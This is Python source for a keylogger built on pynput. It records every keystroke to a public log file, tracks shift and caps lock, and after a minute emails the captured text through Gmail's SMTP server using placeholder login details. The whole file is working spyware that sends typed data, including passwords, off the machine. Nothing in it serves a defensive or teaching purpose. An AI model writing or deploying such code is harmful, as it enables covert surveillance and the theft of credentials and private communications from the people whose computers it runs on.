from pynput.keyboard import Key, Listener
from email.message import EmailMessage
import smtplib
import time

class Keylogger:
    def __init__(self):
        self.start_time = time.time()
        self.shift = False
        self.caps = False

        self.special = {
                        "`": "~",
                        "1": "!",
                        "2": "@",
                        "3": "#",
                        "4": "$",
                        "5": "%",
                        "6": "^",
                        "7": "&",
                        "8": "*",
                        "9": "(",
                        "0": ")",
                        "-": "_",
                        "=": "+",
                        "[": "{",
                        "]": "}",
                        ";": ":",
                        ",": "<",
                        ".": ">",
                        "/": "?",
                       }

    def send_email(self):
      with open("C:/Users/Public/log.txt","r") as file:
          data = file.read()

      server = smtplib.SMTP("smtp.gmail.com",587)

      server.starttls()
      server.ehlo()

      server.login("email","password")

      email_message = EmailMessage()
      email_message["subject"] = "Keylogger Data"
      email_message["From"] = "email"
      email_message["To"] = "email"

      email_message.set_content(str(data))

      server.send_message(email_message)
      server.close()

    def write_key(self,key):
      with open("C:/Users/Public/log.txt","a") as file:
          if time.time() - self.start_time > 60:
               self.send_email()
          if key == Key.space or key == Key.enter:
              file.write("\n")
          elif key == Key.shift:
               if not self.shift:
                   self.shift = True
          elif key == Key.caps_lock:
              if not self.caps:
                  self.caps = True
              else:
                  self.caps = False
          else:
               try:
                  if key.char.isalpha():
                      if self.caps or self.shift:
                          file.write(key.char.upper())
                      else:
                          file.write(key.char)
                  elif key.char.isdigit():
                      if self.shift:
                          file.write(self.special[key.char])
                      else:
                          file.write(key.char)
               except:
                pass
    def check_shift(self,key):
            if key == Key.shift:
                self.shift = False


keylogger = Keylogger()

with Listener(on_press=keylogger.write_key,on_release=keylogger.check_shift) as listener:
    listener.join()






